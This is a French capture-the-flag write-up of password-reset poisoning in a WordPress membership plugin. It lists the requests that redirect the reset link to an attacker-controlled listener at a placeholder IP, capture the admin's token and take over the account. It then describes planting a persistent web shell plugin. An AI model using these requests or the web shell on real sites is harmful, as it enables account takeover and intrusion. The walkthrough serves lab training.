---
title: "Inside Job Q1 · Reset Password Poisoning"
platform: "HackerLab Benin 2026"
category: "web"
difficulty: "—"
points: 0
os: "—"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/web/inside-job1.md"
tags: [hackerlab-benin-2026, web]
status: published
---

# Inside Job : Q1 · CVE-2026-9273 Reset Password Poisoning

**Catégorie** : web  
**Flag** : `HLB2026{restrict-content}`

## TL;DR

Le plugin WordPress Restrict Content 4.0.0 accepte un paramètre `rc_redirect` dans le flow de mot de passe oublié. Un bot interne clique les liens de reset : on empoisonne l'URL pour récupérer le token one-time de `d.admin` et prendre son compte.

## Reconnaissance

Le formulaire de connexion sur `/espace-client/` expose les champs `rc_user_login`, `rc_user_pass`, `rc_login_nonce` et `rc_action=login`. Ces préfixes `rc_` identifient le plugin Restrict Content (Kadence Memberships). L'énumération des utilisateurs WordPress révèle un compte `d.admin` et l'email `eve@vdcbank.vld`.

## Exploitation

Le flow `lostpassword` construit un lien de reset contenant `key=...&login=d.admin` et l'envoie par mail. Si un paramètre `rc_redirect` est fourni dans la requête POST, ce paramètre remplace la base de l'URL dans le mail envoyé.

On ouvre un listener HTTP et on déclenche le reset :

```bash
POST /espace-client/?rc_action=lostpassword
rc_user_login=d.admin&rc_redirect=http://<ATT_IP>:8081/
```

Un bot interne (`172.28.26.2`) suit automatiquement les liens de reset. Il clique l'URL empoisonnée et notre listener reçoit :

```
GET /?action=rp&key=XXXXXXXXXXXXXXXXXXXX&login=d.admin
```

On utilise cette clé pour finaliser le reset et se connecter en tant que `d.admin` :

```bash
POST /espace-client/?rc_action=reset-password
rc_user_login=d.admin&key=XXXXXXXXXXXXXXXXXXXX&rc_new_password=NewPass1!
```

Le cookie `wordpress_logged_in_*` obtenu donne accès à `/wp-admin/`.

## Pivot post-ATO

Une fois admin, on dépose un mu-plugin RCE persistant (`zz-shell.php`) pour éviter de devoir re-rejouer le reset à chaque requête. Plusieurs agents qui tournent en parallèle sur le même compte `d.admin` s'invalident mutuellement : grouper les commandes en une seule requête shell juste après le reset.

Le honeypot sur la page Coffre (`HLB2026{wp_r3s3t_p01s0n_r4c3_w0n}`) est affiché une fois l'accès admin obtenu mais n'est pas le flag de Q1.

## À retenir

Toujours tester `rc_redirect` (et ses équivalents : `redirect_to`, `return_url`, `next`) dans les flows de reset de plugins WordPress. Un bot reviewer qui suit les liens est la primitive récurrente de ce CTF.
